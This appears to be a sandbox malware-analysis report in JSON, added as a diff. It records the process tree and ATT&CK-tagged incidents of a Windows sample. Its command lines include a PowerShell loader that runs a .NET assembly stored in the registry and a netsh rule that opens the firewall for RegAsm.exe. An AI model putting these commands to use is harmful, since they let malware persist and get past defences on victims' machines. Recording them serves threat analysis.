@@ -1,0 +1,136 @@
+{
+ "Name": "yHiBQaSJ_sib.exe",
+ "Md5": "c154ac36d64e02a49ac648005cd68c7b",
+ "UUID": "faf4efbd-33ac-442d-8fde-ab95a41f58d1",
+ "Processes": [
+  {
+   "OID": "5ee144132a5b5017bbbf1637",
+   "ProcessID": 2152,
+   "ParentPID": 348,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\yHiBQaSJ_sib.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\yHiBQaSJ_sib.exe",
+   "ProcessType": "Runned from Explorer.exe",
+   "CreationTimestamp": 0
+  },
+  {
+   "OID": "5ee144132a5b5017bbbf1faa",
+   "ProcessID": 1944,
+   "ParentPID": 348,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\yHiBQaSJ_sib.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\yHiBQaSJ_sib.exe",
+   "ProcessType": "Main process",
+   "CreationTimestamp": 1591821330978
+  },
+  {
+   "OID": "5ee144182a5b5017bbbf7953",
+   "ProcessID": 4052,
+   "ParentPID": 1944,
+   "CommandLine": "\"wscript\" qKtW.vbe",
+   "Image": "C:\\Windows\\system32\\wscript.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1591821333119
+  },
+  {
+   "OID": "5ee1441a2a5b5017bbbfbdcf",
+   "ProcessID": 1576,
+   "ParentPID": 4052,
+   "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" [System.Threading.Thread]::GetDomain().Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\\aTmcTlAklOykBh').GetValue('SzJqAwdHYXhBz'));[BSrLMd]::HvkUW('C:\\Users\\admin\\AppData\\Roaming\\qKtW.vbe', 'IClwLBQ', 'qKtW.vbe')",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1591821334056
+  },
+  {
+   "OID": "5ee1441a2a5b5017bbbfbdd1",
+   "ProcessID": 2932,
+   "ParentPID": 1576,
+   "CommandLine": "\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe\"",
+   "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1591821334806
+  },
+  {
+   "OID": "5ee1441d2a5b5017bbbff78b",
+   "ProcessID": 2320,
+   "ParentPID": 2932,
+   "CommandLine": "netsh firewall add allowedprogram \"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe\" \"RegAsm.exe\" ENABLE",
+   "Image": "C:\\Windows\\system32\\netsh.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1591821341322
+  }
+ ],
+ "Incidents": [
+  {
+   "ProcessOID": "5ee144132a5b5017bbbf1624",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ee1441a2a5b5017bbbfbdd1",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ee1441a2a5b5017bbbfbdd1",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ee1441a2a5b5017bbbfbdd1",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1089"
+   ]
+  },
+  {
+   "ProcessOID": "5ee144182a5b5017bbbf7953",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1086",
+    "T1064"
+   ]
+  },
+  {
+   "ProcessOID": "5ee144132a5b5017bbbf1faa",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1064"
+   ]
+  },
+  {
+   "ProcessOID": "5ee144132a5b5017bbbf1faa",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ee144132a5b5017bbbf1faa",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ee144132a5b5017bbbf1630",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1081"
+   ]
+  },
+  {
+   "ProcessOID": "5ee144132a5b5017bbbf1faa",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1129"
+   ]
+  },
+  {
+   "ProcessOID": "5ee144132a5b5017bbbf1faa",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1081"
+   ]
+  },
+  {
+   "ProcessOID": "5ee144132a5b5017bbbf1faa",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  }
+ ]
+}
